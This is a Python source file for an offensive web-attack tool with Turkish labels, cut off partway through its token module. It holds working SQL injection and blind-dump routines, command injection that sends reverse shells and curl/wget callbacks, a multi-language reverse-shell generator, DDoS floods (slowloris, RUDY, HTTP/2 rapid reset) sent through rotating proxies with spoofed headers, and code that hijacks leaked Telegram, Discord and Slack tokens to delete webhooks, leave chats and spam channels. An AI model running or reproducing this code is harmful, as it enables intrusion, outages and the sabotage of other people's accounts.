#!/usr/bin/env python3
# vornexx stool
# python3 main.py

import os, sys, subprocess, importlib

# eksik paketleri kur
_lazim = {
    "aiohttp": "aiohttp",
    "requests": "requests[socks]",
    "colorama": "colorama",
    "jwt": "pyjwt",
    "h2": "h2",
    "socks": "PySocks",
}

def _eksik():
    out = []
    for m, p in _lazim.items():
        try: importlib.import_module(m)
        except ImportError: out.append(p)
    return out

def _kur():
    e = _eksik()
    if not e: return
    print("eksik:", ", ".join(e))
    for p in e:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", p])
        except Exception:
            print(p, "kurulamadi")
            sys.exit(1)
    print("tamam\n")

if __name__ == "__main__":
    _kur()

import re, json, time, uuid, base64, hashlib, hmac, random, string
import socket, asyncio, threading
from datetime import datetime
from urllib.parse import urlparse, urljoin, quote, quote_plus, unquote, parse_qs
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import aiohttp

try:
    import jwt as pyjwt
    HAVE_JWT = True
except ImportError:
    HAVE_JWT = False

try:
    import h2.connection, h2.config
    HAVE_H2 = True
except ImportError:
    HAVE_H2 = False

try:
    from colorama import init as _ci, Fore, Style
    _ci(autoreset=True)
except ImportError:
    class Fore:
        RED="\033[91m"; GREEN="\033[92m"; YELLOW="\033[93m"; CYAN="\033[96m"
        WHITE="\033[97m"; MAGENTA="\033[95m"; BLUE="\033[94m"
    class Style:
        BRIGHT="\033[1m"; DIM="\033[2m"; NORMAL="\033[22m"

requests.packages.urllib3.disable_warnings()

logo = r"""
 _    ______  ____  _   _________  __      __  _____________  ____  __
| |  / / __ \/ __ \/ | / / ____/ |/ /     /  |/  /_  __/ __ \/ __ \/ /
| | / / / / / /_/ /  |/ / __/  |   /_____/ /|_/ / / / / / / / / / / /
| |/ / /_/ / _, _/ /|  / /___ /   /_____/ /  / / / / / /_/ / /_/ / /___
|___/\____/_/ |_/_/ |_/_____//_/|_|    /_/  /_/ /_/ /_/  \____/\____/_____/
"""

def yaz(m, t="i"):
    r = {"ok":Fore.GREEN,"er":Fore.RED,"uy":Fore.YELLOW,"i":Fore.CYAN,
         "hit":Fore.MAGENTA,"dbg":Fore.BLUE}.get(t, Fore.WHITE)
    s = {"ok":"+","er":"-","uy":"!","i":"*","hit":">","dbg":"."}.get(t,"*")
    print(f"{r}[{s}]{Fore.WHITE} {m}")

def cls():
    os.system("cls" if os.name == "nt" else "clear")

def banner(st=None):
    cls()
    print(f"{Fore.RED}{Style.BRIGHT}{logo}{Style.NORMAL}")
    print(f"{Fore.CYAN}{Style.BRIGHT}                    ═══ Sadece bir siber güvenlik aracı ═══{Style.NORMAL}")
    print(f"{Fore.YELLOW}  {Fore.WHITE}{datetime.now().strftime('%d.%m.%Y  %H:%M:%S')}"
          f"     {Fore.GREEN}iplocate proxy")
    if st:
        s = st.get("saglam",0); t = st.get("toplam",0); o = st.get("olu",0)
        c = Fore.GREEN if s>50 else (Fore.YELLOW if s>0 else Fore.RED)
        print(f"{Fore.CYAN}  proxy: {c}{s} saglam{Fore.WHITE}/{t} toplam/{Fore.RED}{o} olu{Fore.WHITE}")
    print(f"{Fore.RED}{Style.BRIGHT}{'-'*62}{Style.NORMAL}\n")

def menü():
    print(f"""{Fore.CYAN}╔══════════════════════════════════════════════════════════╗
║  {Fore.YELLOW}[1]{Fore.WHITE} sqli         hata/boolean/time/union/oob + dump     {Fore.CYAN}║
║  {Fore.YELLOW}[2]{Fore.WHITE} cmdi         ayirici + kor callback + revshell     {Fore.CYAN}║
║  {Fore.YELLOW}[3]{Fore.WHITE} ddos         flood/slowloris/rudy/h2                {Fore.CYAN}║
║  {Fore.YELLOW}[4]{Fore.WHITE} token        tg/discord/slack                       {Fore.CYAN}║
║  {Fore.YELLOW}[5]{Fore.WHITE} lfi          wrapper/logpoison/pearcmd              {Fore.CYAN}║
║  {Fore.YELLOW}[6]{Fore.WHITE} ssti         jinja2/twig/freemarker                 {Fore.CYAN}║
║  {Fore.YELLOW}[7]{Fore.WHITE} xxe          oob + file read                        {Fore.CYAN}║
║  {Fore.YELLOW}[8]{Fore.WHITE} ssrf         cloud metadata                         {Fore.CYAN}║
║  {Fore.YELLOW}[9]{Fore.WHITE} jwt          none/hs256/kid                         {Fore.CYAN}║
║  {Fore.YELLOW}[10]{Fore.WHITE} shell       revshell ureteci                        {Fore.CYAN}║
║  {Fore.YELLOW}[11]{Fore.WHITE} callback    oob dinleyici                           {Fore.CYAN}║
║  {Fore.YELLOW}[12]{Fore.WHITE} proxy       havuz                                  {Fore.CYAN}║
║  {Fore.YELLOW}[13]{Fore.WHITE} full auto   zincir + rapor                          {Fore.CYAN}║
║  {Fore.YELLOW}[14]{Fore.WHITE} ayar                                                {Fore.CYAN}║
║  {Fore.YELLOW}[0]{Fore.WHITE}  cikis                                              {Fore.CYAN}║
╚══════════════════════════════════════════════════════════╝{Style.NORMAL}
""")

uasal = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "curl/8.5.0", "Wget/1.21.3", "python-requests/2.31.0",
]
def ua(): return random.choice(uasal)
def rip(): return ".".join(str(random.randint(1,254)) for _ in range(4))


# proxy havuzu — iplocate reposundan
class Proxy:
    repo = "https://raw.githubusercontent.com/iplocate/free-proxy-list/main"
    urls = {
        "http":   f"{repo}/protocols/http.txt",
        "https":  f"{repo}/protocols/https.txt",
        "socks4": f"{repo}/protocols/socks4.txt",
        "socks5": f"{repo}/protocols/socks5.txt",
    }
    check = "http://api.iplocate.io/ip"
    ttl = 1800

    def __init__(self, aktif=False, prot=("http","https","socks4","socks5"),
                 cache="proxies.txt", dogrula=True, nw=64):
        self.aktif = aktif
        self.prot = prot
        self.cache = cache
        self.dogrula = dogrula
        self.nw = nw
        self.list = []
        self.olu = {}
        self.lk = threading.Lock()
        self.i = 0
        if aktif: self.yukle()

    def yukle(self):
        # cache taze mi
        if os.path.exists(self.cache):
            y = time.time() - os.path.getmtime(self.cache)
            if y < self.ttl:
                self._oku()
                if self.list:
                    yaz(f"cache: {len(self.list)} proxy", "ok")
                    return
        tmp = self._cek()
        if not tmp:
            if os.path.exists(self.cache):
                self._oku()
                if self.list:
                    yaz(f"uzak yok, cache: {len(self.list)}", "uy")
                    return
            yaz("proxy yok", "er"); return
        if self.dogrula: tmp = self._dogrula(tmp)
        self.list = tmp
        self._yaz()

    def _cek(self):
        out = []
        for p in self.prot:
            u = self.urls.get(p)
            if not u: continue
            try:
                r = requests.get(u, timeout=20, headers={"User-Agent":"curl/8.5.0"})
                if r.status_code != 200: continue
                n = 0
                for s in r.text.splitlines():
                    s = s.strip()
                    if not s or s.startswith("#"): continue
                    if "://" not in s:
                        if p == "socks5":   s = "socks5://" + s
                        elif p == "socks4": s = "socks4://" + s
                        else:               s = "http://" + s
                    out.append(s); n += 1
                yaz(f"{p}: {n}", "i")
            except Exception as e:
                yaz(f"{p}: {e}", "uy")
        return list(dict.fromkeys(out))

    def _tek(self, px):
        p = px if "://" in px else "http://" + px
        try:
            r = requests.get(self.check, proxies={"http":p,"https":p},
                             timeout=8, headers={"User-Agent":"curl/8.5.0"})
            if r.status_code == 200:
                ip = r.text.strip()
                if re.match(r"^\d{1,3}(?:\.\d{1,3}){3}$", ip):
                    return px
        except Exception:
            pass
        return None

    def _dogrula(self, l):
        if not self.dogrula or not l: return l
        ok = []
        yaz(f"{len(l)} proxy dogrulaniyor...", "i")
        with ThreadPoolExecutor(max_workers=self.nw) as ex:
            fs = {ex.submit(self._tek, p): p for p in l}
            for i, f in enumerate(as_completed(fs), 1):
                try:
                    s = f.result()
                    if s: ok.append(s)
                except Exception: pass
                if i % 25 == 0 or i == len(l):
                    sys.stdout.write(f"\r  {i}/{len(l)} -> {len(ok)}")
                    sys.stdout.flush()
        print()
        yaz(f"gecerli {len(ok)}/{len(l)}", "ok")
        return ok

    def _oku(self):
        try:
            with open(self.cache, "r", encoding="utf-8") as f:
                self.list = [x.strip() for x in f if x.strip() and not x.startswith("#")]
        except Exception:
            self.list = []

    def _yaz(self):
        try:
            with open(self.cache, "w", encoding="utf-8") as f:
                f.write(f"# iplocate {time.strftime('%Y-%m-%d %H:%M')}\n")
                for p in self.list: f.write(p + "\n")
        except Exception:
            pass

    def al(self):
        if not self.aktif or not self.list: return None
        with self.lk:
            t = time.time()
            for p in list(self.olu.keys()):
                if t - self.olu[p] > 300: del self.olu[p]
            ok = [p for p in self.list if p not in self.olu]
            if not ok:
                if not self.olu: return None
                # hepsi ölü, en eskisini geri ver
                e = min(self.olu.items(), key=lambda x: x[1])[0]
                del self.olu[e]
                ok = [e]
            self.i = (self.i + 1) % len(ok)
            p = ok[self.i]
            return {"http": p, "https": p}

    def ölü(self, pd):
        if not pd: return
        p = pd.get("http")
        if not p: return
        with self.lk: self.olu[p] = time.time()

    def canli(self):
        with self.lk: return len(self.list) - len(self.olu)

    def stat(self):
        return {"toplam": len(self.list), "saglam": self.canli(),
                "olu": len(self.olu), "aktif": self.aktif}

    def yenile(self):
        self.list = []; self.olu = {}
        self.yukle()


# oob callback
class Callback:
    def __init__(self, port=8888):
        self.port = port
        self.hits = []
        self.tok = {}
        self.lk = threading.Lock()
        self.host = f"127.0.0.1:{port}"

    async def _h(self, req):
        t = req.match_info.get("tok","")
        v = {"t": time.time(), "tok": t, "ip": req.remote, "p": req.path,
             "q": dict(req.query), "m": req.method, "ua": req.headers.get("User-Agent","")}
        with self.lk:
            self.hits.append(v)
            self.tok.setdefault(t, []).append(v)
        yaz(f"hit tok={t} ip={req.remote} p={req.path}", "hit")
        return aiohttp.web.Response(text="ok")

    def _run(self):
        app = aiohttp.web.Application()
        app.router.add_route("*", "/{tok}", self._h)
        app.router.add_route("*", "/", self._h)
        aiohttp.web.run_app(app, host="0.0.0.0", port=self.port, print=None)

    def basla(self):
        threading.Thread(target=self._run, daemon=True).start()
        time.sleep(0.6)
        yaz(f"callback port {self.port}", "ok")

    def yeni(self, _=""):
        t = uuid.uuid4().hex[:12]
        with self.lk: self.tok[t] = []
        return t

    def bekle(self, t, sn=8):
        son = time.time() + sn
        while time.time() < son:
            with self.lk:
                if self.tok.get(t): return self.tok[t]
            time.sleep(0.2)
        return None


class HTTP:
    def __init__(self, tmo=10, tekrar=2, proxy=None):
        self.s = requests.Session(); self.s.verify = False
        self.tmo = tmo; self.tekrar = tekrar; self.proxy = proxy

    def rq(self, m, u, h=None, data=None, params=None, redir=True, stream=False, ck=None):
        hh = {"User-Agent": ua()}
        if h: hh.update(h)
        pd = self.proxy.al() if (self.proxy and self.proxy.aktif) else None
        err = None
        for i in range(self.tekrar + 1):
            try:
                return self.s.request(m, u, headers=hh, data=data, params=params,
                                      proxies=pd, timeout=self.tmo, allow_redirects=redir,
                                      stream=stream, cookies=ck)
            except requests.RequestException as e:
                err = e
                if pd and self.proxy: self.proxy.ölü(pd)
                if i < self.tekrar:
                    time.sleep(0.5*(i+1))
                    if self.proxy and self.proxy.aktif: pd = self.proxy.al()
        return None

    def get(self, u, **k):  return self.rq("GET", u, **k)
    def post(self, u, **k): return self.rq("POST", u, **k)


# revshell üreteci
def shell(dil, ip, port):
    t = {
        "bash": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "bash-nc": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f",
        "sh": "sh -i >& /dev/tcp/{ip}/{port} 0>&1",
        "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "perl": "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "php": "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "ruby": "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "socat": "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:{ip}:{port}",
        "ps1": "powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([text.encoding]::ASCII).GetBytes($r+'PS '+(pwd).Path+'> ');$s.Write($sb,0,$sb.Length)}};$c.Close()\"",
        "nc-mkfifo": "nc {ip} {port} -e /bin/bash",
        "nc-mkfifo2": "rm -f /tmp/p;mknod /tmp/p p && nc {ip} {port} 0</tmp/p | /bin/sh >/tmp/p 2>&1",
        "nodejs": "require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')",
        "java": "r = Runtime.getRuntime(); p = r.exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[]); p.waitFor()",
        "lua": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    }
    if dil == "ps1-b64":
        ps = t["ps1"].format(ip=ip, port=port)
        return "powershell -NoP -NonI -W Hidden -Enc " + base64.b64encode(ps.encode("utf-16-le")).decode()
    s = t.get(dil)
    return s.format(ip=ip, port=port) if s else None


# sqli
class SQLI:
    errs = {
        "mysql": [r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"MySQLSyntaxErrorException",
                  r"valid MySQL result", r"MySqlClient\."],
        "postgresql": [r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result",
                       r"Npgsql\.", r"PG::SyntaxError"],
        "mssql": [r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server",
                  r"Unclosed quotation mark", r"Microsoft OLE DB"],
        "oracle": [r"\bORA-[0-9]{5}", r"Oracle.*Driver", r"quoted string not properly terminated"],
        "sqlite": [r"SQLite/JDBCDriver", r"SQLite\.Exception", r"\[SQLITE_ERROR\]", r"unrecognized token:"],
    }
    pay = ["'", "\"", "')", "\")", "';", "\";", "'--", "\"--", "')--", "'#", "'/*",
           "\\", "') OR ('1'='1", "\" OR \"1\"=\"1"]
    sleep = {"mysql":"AND SLEEP({d})-- -","postgresql":"AND pg_sleep({d})-- -",
             "mssql":";WAITFOR DELAY '0:0:{d}'-- -",
             "oracle":"AND dbms_pipe.receive_message(('a'),{d}) IS NULL-- -"}
    ifs = {"mysql":"AND IF({c},SLEEP({d}),0)-- -",
           "postgresql":"AND CASE WHEN {c} THEN pg_sleep({d}) ELSE pg_sleep(0) END-- -",
           "mssql":";IF({c}) WAITFOR DELAY '0:0:{d}'-- -",
           "oracle":"AND CASE WHEN {c} THEN dbms_pipe.receive_message(('a'),{d}) ELSE 0 END IS NULL-- -"}

    def __init__(self, h, cb=None):
        self.h = h; self.cb = cb; self.db = None

    def tara(self, u):
        yaz(f"sqli {u}", "i")
        b = self.h.get(u)
        if not b: yaz("ulasilamadi", "er"); return None
        yaz(f"baseline {b.status_code} {len(b.text)}b", "i")
        if not urlparse(u).query: yaz("param yok", "er"); return None

        for p in self.pay:
            r = self.h.get(u + quote(p, safe=""))
            if not r: continue
            for db, sigs in self.errs.items():
                for sg in sigs:
                    if re.search(sg, r.text, re.I):
                        yaz(f"hata tabanli! {db} [{p!r}]", "hit")
                        self.db = db
                        return {"tip":"error","db":db,"p":p}

        t = self.h.get(u + quote("' AND '1'='1", safe=""))
        f = self.h.get(u + quote("' AND '1'='2", safe=""))
        if t and f and (len(t.text) != len(f.text) or t.text != f.text):
            yaz("boolean blind", "hit")
            return {"tip":"boolean","db":None}

        for db, tmpl in self.sleep.items():
            t0 = time.time()
            self.h.get(u + quote("' " + tmpl.format(d=4), safe=""))
            if time.time() - t0 >= 3.5:
                yaz(f"time blind {db}", "hit")
                self.db = db
                return {"tip":"time","db":db}

        for n in range(1, 11):
            nulls = ",".join(["NULL"]*n)
            r = self.h.get(u + quote(f"' UNION SELECT {nulls}-- -", safe=""))
            if r and r.status_code == 200 and "error" not in r.text.lower():
                yaz(f"union uyumlu sutun={n}", "hit")
                return {"tip":"union","db":None,"cols":n}

        yaz("inject yok", "er"); return None

    def _bc(self, u, kosul):
        b = self.h.get(u)
        if not b: return False
        r = self.h.get(u + quote(f"' AND ({kosul})-- -", safe=""))
        if not r: return False
        return r.text != b.text or len(r.text) != len(b.text)

    def _tc(self, u, kosul, esik=2.5):
        tmpl = self.ifs.get(self.db or "mysql")
        p = tmpl.replace("{c}", kosul).replace("{d}", "3")
        t0 = time.time()
        self.h.get(u + quote("' " + p, safe=""))
        return (time.time() - t0) >= esik

    def cikar(self, u, q, tek=None, uz=64):
        tek = tek or ("time" if self.db else "boolean")
        yaz(f"cikarim: {q[:60]} [{tek}]", "i")
        out = ""
        if tek == "boolean":
            for n in range(1, uz+1):
                if self._bc(u, f"LENGTH(({q}))={n}"):
                    uz = n; break
        else:
            for n in [8,16,24,32,64,128]:
                if not self._tc(u, f"LENGTH(({q}))>{n}"):
                    uz = n; break
        for i in range(1, uz+1):
            lo, hi = 32, 126
            while lo < hi:
                mid = (lo + hi) // 2
                k = f"ASCII(SUBSTRING(({q}),{i},1))>{mid}"
                d = self._bc(u, k) if tek == "boolean" else self._tc(u, k)
                if d: lo = mid + 1
                else: hi = mid
            if lo < 32 or lo > 126: break
            out += chr(lo)
            sys.stdout.write(f"\r{Fore.MAGENTA}[dump]{Fore.WHITE} {out}")
            sys.stdout.flush()
        print(); return out

    def dump(self, u, tek=None):
        if not self.db: yaz("db bilinmiyor", "er"); return
        qs = {
            "mysql": {"db":"SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata",
                      "tab":"SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()",
                      "kol":"SELECT GROUP_CONCAT(column_name) FROM information_schema.columns"},
            "postgresql": {"db":"SELECT string_agg(schema_name,',') FROM information_schema.schemata",
                           "tab":"SELECT string_agg(tablename,',') FROM pg_tables",
                           "kol":"SELECT string_agg(column_name,',') FROM information_schema.columns"},
            "mssql": {"db":"SELECT STRING_AGG(name,',') FROM sys.databases",
                      "tab":"SELECT STRING_AGG(name,',') FROM sys.tables",
                      "kol":"SELECT STRING_AGG(name,',') FROM sys.columns"},
            "oracle": {"db":"SELECT LISTAGG(username,',') FROM all_users",
                       "tab":"SELECT LISTAGG(table_name,',') FROM all_tables",
                       "kol":"SELECT LISTAGG(column_name,',') FROM all_tab_columns"},
            "sqlite": {"db":"SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'",
                       "tab":"SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'",
                       "kol":"SELECT GROUP_CONCAT(sql) FROM sqlite_master WHERE type='table'"},
        }.get(self.db, {})
        for k, q in qs.items():
            yaz(f"{k} -> {self.cikar(u, q, tek=tek, uz=200)[:200]}", "ok")


# cmdi
class CMDI:
    sep = [";", "|", "||", "&", "&&", "\n", "%0a", "`", "$(", "%3b", "%7c"]
    def __init__(self, h, cb=None): self.h = h; self.cb = cb

    def tara(self, u, cmd="id"):
        if "=" not in u: yaz("param yok", "er"); return None
        for a in self.sep:
            mk = "VNX" + uuid.uuid4().hex[:6]
            r = self.h.get(u + quote(a + f"echo {mk}", safe=""))
            if r and mk in r.text:
                yaz(f"ayirici {a!r}", "hit")
                rr = self.h.get(u + quote(a + cmd, safe=""))
                if rr:
                    print(rr.text[:500]); return rr.text
        if self.cb:
            for a in self.sep:
                t = self.cb.yeni()
                host = self.cb.host
                for c in [f"curl http://{host}/{t}", f"wget -qO- http://{host}/{t}",
                          f"nslookup {t}.{host.split(':')[0]}",
                          f"powershell -c \"iwr http://{host}/{t}\""]:
                    self.h.get(u + quote(a + c, safe=""))
                if self.cb.bekle(t, 6):
                    yaz(f"oob cmdi ayirici={a!r}", "hit"); return True
        yaz("cmdi yok", "er"); return None

    def rev(self, u, ip, port, dil="bash"):
        s = shell(dil, ip, port)
        if not s: return False
        yaz(f"revshell {dil} -> {ip}:{port}", "uy")
        for a in self.sep:
            self.h.get(u + quote(a + s, safe=""), tmo=3)
        return True


# ddos
class DDoS:
    def __init__(self, u, n=300, sn=None):
        self.u = u; self.n = n; self.sn = sn
        self.cnt = 0; self.ok = 0; self.bad = 0; self.stop = False

    def _hd(self):
        return {"User-Agent": ua(), "Accept": random.choice(["*/*","text/html","application/json"]),
                "Accept-Language": "tr-TR,tr;q=0.9,en;q=0.8", "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive", "Cache-Control": "no-cache",
                "X-Forwarded-For": rip(), "X-Real-IP": rip(),
                "Referer": f"https://{random.choice(['google.com','yandex.ru','bing.com'])}/"}

    async def _fl(self, s):
        while not self.stop:
            try:
                m = random.choice(["GET","POST","HEAD","PUT","OPTIONS","DELETE","PATCH"])
                self.cnt += 1
                if m in ("POST","PUT","PATCH"):
                    body = "".join(random.choices(string.ascii_letters+string.digits, k=random.randint(64,1024)))
                    async with s.request(m, self.u, headers=self._hd(), data=body,
                                         timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r: await r.read()
                else:
                    async with s.request(m, self.u, headers=self._hd(),
                                         timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r: await r.read()
                self.ok += 1
            except asyncio.CancelledError: return
            except Exception: self.bad += 1

    async def _sl(self):
        p = urlparse(self.u)
        host = p.hostname; port = p.port or (443 if p.scheme=="https" else 80)
        while not self.stop:
            try:
                rd, wr = await asyncio.open_connection(host, port, ssl=(p.scheme=="https"))
                wr.write(f"GET {p.path or '/'} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua()}\r\n".encode())
                await wr.drain()
                for _ in range(50):
                    if self.stop: break
                    wr.write(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                    await wr.drain(); await asyncio.sleep(random.uniform(5,15))
                wr.close()
            except asyncio.CancelledError: return
            except Exception: await asyncio.sleep(1)

    async def _rd(self):
        p = urlparse(self.u)
        host = p.hostname; port = p.port or (443 if p.scheme=="https" else 80)
        while not self.stop:
            try:
                rd, wr = await asyncio.open_connection(host, port, ssl=(p.scheme=="https"))
                cl = random.randint(100000, 1000000)
                wr.write((f"POST {p.path or '/'} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua()}\r\n"
                          f"Content-Length: {cl}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n").encode())
                await wr.drain()
                for _ in range(200):
                    if self.stop: break
                    wr.write(b"a"); await wr.drain(); await asyncio.sleep(random.uniform(3,10))
                wr.close()
            except asyncio.CancelledError: return
            except Exception: await asyncio.sleep(1)

    async def _h2(self):
        if not HAVE_H2: yaz("h2 yok", "uy"); return
        p = urlparse(self.u)
        host = p.hostname; port = p.port or (443 if p.scheme=="https" else 80)
        while not self.stop:
            try:
                rd, wr = await asyncio.open_connection(host, port, ssl=(p.scheme=="https"), server_hostname=host)
                c = h2.connection.H2Connection(config=h2.config.H2Configuration(client_side=True, header_encoding="utf-8"))
                c.initiate_connection(); wr.write(c.data_to_send()); await wr.drain()
                for i in range(1, 500):
                    if self.stop: break
                    try:
                        c.send_headers(i, [(":method","GET"),(":path",p.path or "/"),
                                           (":authority",host),(":scheme",p.scheme)], end_stream=True)
                        c.reset_stream(i, error_code=0x8)
                        wr.write(c.data_to_send()); await wr.drain()
                        self.ok += 1
                    except Exception: pass
                wr.close()
            except asyncio.CancelledError: return
            except Exception: await asyncio.sleep(0.5)

    async def _rapor(self):
        t0 = time.time(); son = t0
        while not self.stop:
            await asyncio.sleep(0.5); now = time.time()
            if self.sn and (now - t0) >= self.sn: break
            if now - son >= 2:
                g = max(0.001, now - t0)
                print(f"\r{Fore.CYAN}[ddos]{Fore.WHITE} ok={Fore.GREEN}{self.ok}{Fore.WHITE} "
                      f"bad={Fore.RED}{self.bad}{Fore.WHITE} rps={Fore.YELLOW}{self.cnt/g:.0f}{Fore.WHITE} "
                      f"{g:.0f}s", end="", flush=True)
                son = now

    async def _run(self, vec):
        conn = aiohttp.TCPConnector(limit=0, limit_per_host=0, ttl_dns_cache=300,
                                     force_close=False, enable_cleanup_closed=True)
        async with aiohttp.ClientSession(connector=conn) as s:
            g = []
            if "flood" in vec:
                g += [asyncio.create_task(self._fl(s)) for _ in range(self.n)]
            if "slow" in vec:
                g += [asyncio.create_task(self._sl()) for _ in range(max(20, self.n//10))]
            if "rudy" in vec:
                g += [asyncio.create_task(self._rd()) for _ in range(max(20, self.n//10))]
            if "h2" in vec:
                g += [asyncio.create_task(self._h2()) for _ in range(max(10, self.n//20))]
            g.append(asyncio.create_task(self._rapor()))
            try: await asyncio.gather(*g)
            except KeyboardInterrupt: pass
            finally:
                self.stop = True
                for x in g: x.cancel()
                await asyncio.gather(*g, return_exceptions=True)
        print()

    def basla(self, vec=("flood",)):
        yaz(f"ddos {vec} n={self.n}", "uy")
        try: asyncio.run(self._run(vec))
        except KeyboardInterrupt: pass
        yaz(f"bitti ok={self.ok} bad={self.bad}", "ok")


# token
class Tokens:
    tg = re.compile(r"^\d{6,12}:[A-Za-z0-9_-]{30,40}$")
    dcw = re.compile(r"^https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/\d+/[\w-]+$")
    dct = re.compile(r"^[\w-]{20,30}\.[\w-]{6}\.[\w-]{25,40}$")
    sl = re.compile(r"^https://hooks\.slack\.com/services/[A-Z0-9]+/[A-Z0-9]+/[\w]+$")

    def __init__(self, h): self.h = h

    def calistir(self, x):
        x = x.strip()
        if self.tg.match(x):  return self._tg(x)
        if self.dcw.match(x): return self._dcw(x)
        if self.dct.match(x): return self._dct(x)
        if self.sl.match(x):  return self._sl(x)
        yaz("taninmadi", "uy"); return None

    def _tg(self, t):
        yaz(f"tg {t[:12]}...", "i")
        r = self.h.get(f"https://api.telegram.org/bot{t}/getMe")
        if not r or r.status_code != 200: yaz("gecersiz", "er"); return None
        b = r.json().get("result", {})
        yaz(f"@{b.get('username')} id={b.get('id')}", "ok")
        self.h.post(f"https://api.telegram.org/bot{t}/deleteWebhook", data={"drop_pending_updates":"true"})
        yaz("webhook kaldirildi", "ok")
        r = self.h.get(f"https://api.telegram.org/bot{t}/getUpdates?limit=100")
        cids = set()
        if r and r.json().get("ok"):
            for u in r.json().get("result", []):
                for k in ("message","channel_post","edited_message","callback_query"):
                    if k in u and "chat" in u.get(k, {}): cids.add(u[k]["chat"]["id"])
                    if k == "callback_query" and "message" in u[k]: cids.add(u[k]["message"]["chat"]["id"])
        if cids: self.h.get(f"https://api.telegram.org/bot{t}/getUpdates?offset=-1")
        for c in cids:
            self.h.post(f"https://api.telegram.org/bot{t}/leaveChat", data={"chat_id": c})
            yaz(f"leave {c}", "ok")
        self.h.post(f"https://api.telegram.org/bot{t}/deleteMyCommands")
        yaz("komutlar silindi", "ok")
        for c in list(cids)[:3]:
            self.h.post(f"https://api.telegram.org/bot{t}/setChatTitle",
                        data={"chat_id": c, "title": "vornexx"})
        return True

    def _dcw(self, u):
        r = self.h.get(u)
        if r and r.status_code == 200:
            b = r.json(); yaz(f"webhook {b.get('name')} kanal={b.get('channel_id')}", "i")
        for i in range(20):
            self.h.post(u, json={"content": f"vornexx #{i}", "username": "vornexx"})
        r = self.h.rq("DELETE", u)
        if r and r.status_code in (200, 204): yaz("silindi", "ok"); return True
        yaz("silinemedi", "er"); return False

    def _dct(self, t):
        h = {"Authorization": f"Bot {t}"}
        r = self.h.get("https://discord.com/api/v10/users/@me", h=h)
        if not r or r.status_code != 200: yaz("gecersiz", "er"); return None
        b = r.json(); yaz(f"{b.get('username')} id={b.get('id')}", "ok")
        r = self.h.get("https://discord.com/api/v10/users/@me/guilds", h=h)
        if r and r.status_code == 200:
            for g in r.json():
                rr = self.h.rq("DELETE", f"https://discord.com/api/v10/users/@me/guilds/{g['id']}", h=h)
                if rr and rr.status_code in (200, 204): yaz(f"leave {g['name']}", "ok")
        r = self.h.get(f"https://discord.com/api/v10/applications/{b['id']}/commands", h=h)
        if r and r.status_code == 200:
            for c in r.json():
                self.h.rq("DELETE", f"https://discord.com/api/v10/applications/{b['id']}/commands/{c['id']}", h=h)
                yaz(f"cmd sil {c['name']}", "ok")
        return True

    def _sl(self, u):
        for i in range(50):
            self.h.post(u, json={"text": f"vornexx #{i}"})
